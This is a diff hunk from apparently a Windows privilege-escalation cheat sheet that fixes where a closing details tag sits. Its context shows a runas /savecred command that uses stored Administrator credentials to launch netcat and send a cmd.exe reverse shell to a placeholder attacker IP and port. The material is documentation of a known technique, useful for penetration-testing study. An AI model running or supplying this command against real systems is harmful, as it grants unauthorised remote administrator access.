@@ -300,8 +300,8 @@ If there are stored credentials, we can run commands as that user:
 Execute commands by using runas with the /savecred argument. Note that full paths are generally needed:
 
 .. code-block:: none
-</details>
-
 
 
     runas /user:PWNED\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\Public\nc.exe -nv <attacker-ip> <attacker-port> -e cmd.exe"
+
+   </details>
